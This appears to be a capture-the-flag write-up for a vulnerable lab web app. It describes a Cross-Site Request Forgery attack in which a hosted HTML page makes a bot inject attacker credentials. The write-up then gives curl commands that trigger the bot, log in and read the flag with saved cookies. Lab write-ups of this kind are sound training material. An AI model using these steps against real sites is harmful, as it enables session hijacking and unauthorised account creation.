# Tornadowebservice

# Project Overview
The challenge is to exploiting a vulnerable web application called tornado wed service
Inject new credentials via a Cross-Site Request Forgery attack via hosting an html payload on local system .
Log in with the injected credentials.
Access sensitive data like flags and create a new user from a protected endpoint.

# Tools Used
Kali Linux

Burpsuite

Html

Json

Curl

# Methodology
Enumerate available endpoints and Get and Post requests on burpsuite:
/get_tornados
/update_tornado
/login
/stats
/report_tornado

# Study endpoint behaviors using tools like:
curl
Burp Suite 
browser developer tools

# Planning the Exploit

Find vulnerabilities to create an actionable exploit.
Vulnerability: Cross-Site Request Forgery
The bot is tricked into executing JavaScript on your hosted page and exploit its authenticated session.
Inject malicious data into the application (kittykat user credentials).
Log in and access the protected /stats endpoint.

# Tasks:
Create a malicious JavaScript payload(index.html) to fetch data from /get_tornados.
Update machine details in /update_tornado with injected credentials.
Host this payload as index.html on a local server or on NGROK Public server if you have the subscription.

# Hosting the exploit and exploiting the vulnerability

Firstly make sure to change the ipaddress and your port numbers according to your machine.

Get the status of the Ip Machine to know about it

`curl -X GET "http://94.237.63.109:45919/stats"`

Run the following command to host index.html file http server.

`python -m http.server 1337`

Reporting a Tornado on the Box server.

`curl "http://94.237.59.207:47563/report_tornado?ip=127.0.0.1"`

Inject the new User to the server for getting access and store cookie data

`curl -X POST "http://94.237.59.207:47563/login" \           
-H "Content-Type: application/json" \
-d '{"username": "kittykat", "password": "kittykat"}' \
-c cookie.txt
`
Run the following command to get cookie data.

`curl -X GET "http://94.237.59.207:47563/stats" -b cookie.txt`

Submit the retrived flag.

# Pictures
![Screenshot_2024-11-22_23_34_25](https://github.com/user-attachments/assets/b56d6354-713c-4e9e-8692-8e1b9c355b17)

![Screenshot_2024-11-22_23_51_13](https://github.com/user-attachments/assets/18d85946-bff7-461c-a9d5-4182be43abb7)


![Screenshot_2024-11-22_23_50_53](https://github.com/user-attachments/assets/5d8c63d1-1578-4331-a8b2-85daa8de0eb7)


